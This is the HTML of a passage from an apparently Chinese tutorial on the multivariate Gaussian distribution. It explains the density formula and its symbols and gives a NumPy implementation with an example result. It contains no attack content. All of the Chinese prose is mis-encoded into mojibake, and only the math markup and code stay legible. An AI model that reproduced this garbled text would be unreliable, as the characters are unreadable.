<p>ä¸‹é¢çš„å›¾åƒå±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„<strong>äºŒç»´é«˜æ–¯åˆ†å¸ƒï¼ˆäºŒå…ƒæ­£æ€åˆ†å¸ƒï¼‰</strong> çš„æ¦‚ç‡å¯†åº¦æ›²é¢å›¾ã€‚å®ƒæ˜¯ä¸€ä¸ªå¹³æ»‘çš„<strong>é’Ÿå½¢æ›²é¢</strong>ï¼Œå…¶å³°å€¼ä½äºå‡å€¼ç‚¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>Î¼</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>Î¼</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\mu_1,\mu_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">Î¼</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">Î¼</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> å¤„ã€‚æ›²é¢çš„â€œå½¢çŠ¶â€ç”±åæ–¹å·®çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î£</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î£</span></span></span></span></span> å†³å®šã€‚ä¸‹å›¾æ¸…æ™°åœ°å±•ç¤ºäº†è¿™ç§å¯¹ç§°çš„é’Ÿå½¢ç»“æ„ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f44c7b795647428ba26df6a485c71c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=zrIgik%2FjqIk1W%2BinfWN1DrdvNYI%3D" alt="c5.jpg" loading="lazy"/></p>
<p>å¯¹äºä¸‰ç»´é«˜æ–¯åˆ†å¸ƒï¼Œåœ¨ä¸‰ç»´ç©ºé—´ä¸­å®Œæ•´å¯è§†åŒ–æ¦‚ç‡å¯†åº¦å‡½æ•°è¾ƒä¸ºå›°éš¾ï¼Œå› æ­¤å¸¸ç”¨<strong>ä¸‰ç»´ç‚¹äº‘å›¾</strong>æ¥è¿‘ä¼¼è¡¨ç¤ºå…¶åˆ†å¸ƒå½¢æ€ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œæ¯ä¸ªç‚¹çš„ä½ç½®ä»£è¡¨ä¸€ä¸ªä¸‰ç»´æ ·æœ¬ï¼Œé¢œè‰²æˆ–å¯†åº¦è¡¨ç¤ºè¯¥ç‚¹å‡ºç°çš„æ¦‚ç‡å¤§å°ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ ·æœ¬ç‚¹å¯†é›†åœ°åˆ†å¸ƒåœ¨å‡å€¼ç‚¹é™„è¿‘ï¼Œå¹¶éšç€è·ç¦»å¢åŠ è€Œé€æ¸ç¨€ç–ï¼Œæ•´ä½“å½¢çŠ¶å¤§è‡´å‘ˆæ¤­çƒçŠ¶ã€‚è¿™ä¸ªæ¤­çƒçš„æœå‘ä¸ä¼¸å±•ç¨‹åº¦ï¼Œå®Œå…¨ç”±ä¸‰ç»´åæ–¹å·®çŸ©é˜µçš„ç‰¹å¾å‘é‡å’Œç‰¹å¾å€¼å†³å®šã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dadd805da54545d9a59d0d19beb99003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=gmE8R2Hv3oJLnvsjPocfIcGoxXo%3D" alt="c6.jpg" loading="lazy"/></p>
<p>å› æ­¤ï¼Œåœ¨æ•°å­¦ä¸Šï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> ç»´é«˜æ–¯åˆ†å¸ƒï¼ˆå¤šå…ƒæ­£æ€åˆ†å¸ƒï¼‰çš„æ¦‚ç‡å¯†åº¦å‡½æ•°å®šä¹‰ä¸ºï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mi mathvariant="normal">âˆ£</mi><mi mathvariant="bold-italic">Î¼</mi><mo separator="true">,</mo><mi mathvariant="normal">Î£</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>2</mn><mi>Ï€</mi><msup><mo stretchy="false">)</mo><mfrac><mi>n</mi><mn>2</mn></mfrac></msup><mi mathvariant="normal">âˆ£</mi><mi mathvariant="normal">Î£</mi><msup><mi mathvariant="normal">âˆ£</mi><mn>0.5</mn></msup></mrow></mfrac><mi>exp</mi><mo>â¡</mo><mo stretchy="false">(</mo><mo>âˆ’</mo><mfrac><mrow><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ’</mo><mi mathvariant="bold-italic">Î¼</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><msup><mi mathvariant="normal">Î£</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>âˆ’</mo><mi mathvariant="bold-italic">Î¼</mi><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x}|\boldsymbol{\mu},\Sigma ) = \frac{1}{(2\pi)^{\frac{n}{2} }|\Sigma|^{0.5}}\exp(-\frac{(\mathbf{x}-\boldsymbol{\mu})^{T}\Sigma^{-1}(\mathbf{x}-\boldsymbol{\mu})}{2} )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mord">âˆ£</span><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">Î£</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.491em;vertical-align:-0.9726em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.2774em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8326em;"><span style="top:-3.3486em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6915em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span><span class="mord">âˆ£Î£</span><span class="mord"><span class="mord">âˆ£</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0.5</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9726em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">exp</span><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span></span></span></div>
<p>åˆæ¬¡è§åˆ°è¿™ä¸ªå…¬å¼å¯èƒ½ä¼šè§‰å¾—å¤æ‚ï¼Œä½†æˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£ï¼šå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¤šå…ƒå‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>â€¦</mo><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x_1, x_2, \dots, x_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">â€¦</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>ï¼Œå…¶æ ¸å¿ƒç»“æ„ä»ä¸ä¸€ç»´é«˜æ–¯åˆ†å¸ƒç›¸ä¼¼ï¼Œåªæ˜¯å°†æ ‡é‡å‡å€¼ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¼</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Î¼</span></span></span></span></span> æ‰©å±•ä¸ºå‡å€¼å‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">Î¼</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span></span></span></span></span>ï¼Œå¹¶å°†æ–¹å·® <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Ïƒ</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\sigma^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> æ¨å¹¿ä¸ºåæ–¹å·®çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î£</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î£</span></span></span></span></span>ã€‚</p>
<p>å¼ä¸­å„ç¬¦å·çš„å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">x</mi></mrow><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">x</span></span></span></span></span> æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> ç»´æ•°æ®å‘é‡ï¼Œå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>Ã—</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªè§‚æµ‹æ ·æœ¬ï¼›</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">Î¼</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span></span></span></span></span> æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> ç»´å‡å€¼å‘é‡ï¼Œå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>Ã—</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n \times 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œè¡¨ç¤ºå„ç»´åº¦ä¸Šçš„å‡å€¼ï¼›</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î£</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î£</span></span></span></span></span> æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>Ã—</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> çš„åæ–¹å·®çŸ©é˜µï¼ˆå®å¯¹ç§°ä¸”æ­£å®šï¼‰ï¼Œå®ƒå†³å®šäº†åˆ†å¸ƒçš„å½¢æ€ä¸æ–¹å‘ï¼›</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Î£</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\Sigma^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span> æ˜¯åæ–¹å·®çŸ©é˜µçš„é€†ï¼›</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">âˆ£</mi><mi mathvariant="normal">Î£</mi><mi mathvariant="normal">âˆ£</mi></mrow><annotation encoding="application/x-tex">|\Sigma|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">âˆ£Î£âˆ£</span></span></span></span></span> è¡¨ç¤ºåæ–¹å·®çŸ©é˜µçš„è¡Œåˆ—å¼ï¼Œç”¨äºå¯¹æ•´ä¸ªåˆ†å¸ƒè¿›è¡Œå½’ä¸€åŒ–ã€‚</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬ç”¨ Python æ¥å®ç°è¿™ä¸ªå¤šå…ƒé«˜æ–¯åˆ†å¸ƒçš„æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">def</span> <span class="hljs-title function_">multivariate_gaussian</span>(<span class="hljs-params">x, mu, Sigma</span>):
    <span class="hljs-string">"""
    è®¡ç®—å¤šå…ƒé«˜æ–¯åˆ†å¸ƒçš„æ¦‚ç‡å¯†åº¦å‡½æ•°

    å‚æ•°:
    x: è¾“å…¥å‘é‡, å½¢çŠ¶ (n,)
    mu: å‡å€¼å‘é‡, å½¢çŠ¶ (n,)
    Sigma: åæ–¹å·®çŸ©é˜µ, å½¢çŠ¶ (n, n)

    è¿”å›:
    æ¦‚ç‡å¯†åº¦å€¼ï¼šæ ‡é‡
    """</span>
    <span class="hljs-comment"># 1. è®¡ç®—ç»´åº¦</span>
    n = <span class="hljs-built_in">len</span>(mu)
    <span class="hljs-comment"># 2. è®¡ç®—åæ–¹å·®çŸ©é˜µçš„è¡Œåˆ—å¼</span>
    det_Sigma = np.linalg.det(Sigma)
    <span class="hljs-comment"># 3. è®¡ç®—åæ–¹å·®çŸ©é˜µçš„é€†</span>
    inv_Sigma = np.linalg.inv(Sigma)
    <span class="hljs-comment"># 4. è®¡ç®— x ä¸ mu çš„å·®å€¼</span>
    diff = x - mu
    <span class="hljs-comment"># 5. è®¡ç®—æŒ‡æ•°éƒ¨åˆ†: (x-Î¼)^T Î£^(-1) (x-Î¼)</span>
    exponent = -<span class="hljs-number">0.5</span> * diff.T @ inv_Sigma @ diff
    <span class="hljs-comment"># 6. è®¡ç®—å½’ä¸€åŒ–ç³»æ•°</span>
    normalization = <span class="hljs-number">1.0</span> / ((<span class="hljs-number">2</span> * np.pi) ** (n / <span class="hljs-number">2</span>) * np.sqrt(det_Sigma))
    <span class="hljs-comment"># 7. è®¡ç®—æœ€ç»ˆæ¦‚ç‡å¯†åº¦</span>
    pdf_value = normalization * np.exp(exponent)
    <span class="hljs-keyword">return</span> pdf_value
</code></pre>
<p>ä¸‹é¢æ¥ä½¿ç”¨ä¸€ä¸‹è¿™ä¸ª<code>multivariate_gaussian</code>å‡½æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡å€¼å‘é‡</span>
mu = np.array([<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>])
<span class="hljs-comment"># åæ–¹å·®çŸ©é˜µï¼ˆæ­£å®šå¯¹ç§°ï¼‰</span>
Sigma = np.array([[<span class="hljs-number">1.0</span>, <span class="hljs-number">0.5</span>], 
                  [<span class="hljs-number">0.5</span>, <span class="hljs-number">1.0</span>]])
<span class="hljs-comment"># æµ‹è¯•ç‚¹</span>
x_test = np.array([<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>])
<span class="hljs-comment"># è®¡ç®—æµ‹è¯•ç‚¹çš„æ¦‚ç‡å¯†åº¦</span>
pdf_value = multivariate_gaussian(x_test, mu, Sigma)
<span class="hljs-comment"># è¾“å‡ºç»“æœ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¦‚ç‡å¯†åº¦ N(x|Î¼,Î£): <span class="hljs-subst">{pdf_value}</span>"</span>)

<span class="hljs-comment">## ====è¾“å‡º====</span>
æ¦‚ç‡å¯†åº¦ N(x|Î¼,Î£): <span class="hljs-number">0.1555632781262252</span>
</code></pre>
<p>ä»ç›´è§‚ä¸Šç†è§£ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">Î¼</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span></span></span></span></span> è¡¨ç¤ºæ•°æ®åˆ†å¸ƒçš„ä¸­å¿ƒä½ç½®ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">x</mi></mrow><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">x</span></span></span></span></span> æ˜¯ç©ºé—´ä¸­çš„ä¸€ä¸ªç‚¹ï¼Œæ¦‚ç‡å¯†åº¦å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> åˆ™åæ˜ äº†è¯¥ç‚¹å‡ºç°çš„ç›¸å¯¹å¯èƒ½æ€§/æ¦‚ç‡ã€‚</p>
<p>ç„¶è€Œï¼Œä¸ºä»€ä¹ˆä¸€ç»´é«˜æ–¯ä¸­çš„æ ‡å‡†å·® <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span> åœ¨å¤šç»´æƒ…å†µä¸‹ä¼šæ‰©å±•ä¸ºä¸€ä¸ªåæ–¹å·®çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î£</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span 